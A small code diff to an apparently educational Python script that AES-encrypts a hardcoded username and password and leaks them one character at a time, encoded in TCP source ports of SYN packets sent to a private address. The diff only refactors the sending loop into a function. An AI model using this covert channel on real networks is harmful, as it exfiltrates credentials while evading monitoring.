@@ -16,6 +16,15 @@ def encrypt(key, clear):
 	msg = EncodeAES(cipher, clear)
 	return msg
 
+def send_msg(msg):
+	print msg
+	for c in msg:
+		segment = TCP(sport=ord(c) + 10000)
+		send(packet/segment)
+		sleep(1)
+	segment = TCP(sport=30000)
+	send(packet/segment)
+
 def main(argv):
 	packet = IP(dst='192.168.10.2')
 	segment = TCP(dport=80, flags=0x02)
@@ -23,12 +32,7 @@ def main(argv):
 	key = ':Yjds52%9wnsjp>)'
 	clear = 'mrbaasman : P@s5w0Rt'
 	msg = encrypt(key, clear)
-
-	print msg
-	for c in msg:
-		segment = TCP(sport=ord(c) + 10000)
-		send(packet/segment)
-		sleep(1)
+	send_msg(msg)
 
 if __name__ == '__main__':
 	main(sys.argv)
